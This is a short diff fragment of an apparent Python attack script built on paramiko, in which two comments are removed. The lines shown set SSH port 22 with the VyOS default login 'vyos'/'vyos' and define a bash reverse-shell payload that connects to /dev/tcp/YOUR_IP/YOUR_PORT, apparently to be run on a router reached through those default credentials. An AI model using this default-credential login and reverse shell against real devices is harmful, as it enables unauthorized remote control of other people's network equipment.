@@ -3,12 +3,10 @@ import paramiko
 import time
 import argparse
 
-# User settings
 RPORT = 22
 USERNAME = 'vyos'
 PASSWORD = 'vyos'
 
-# Replace with your actual IP and port for the reverse shell
 payload_cmd = "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"
 
 def main():
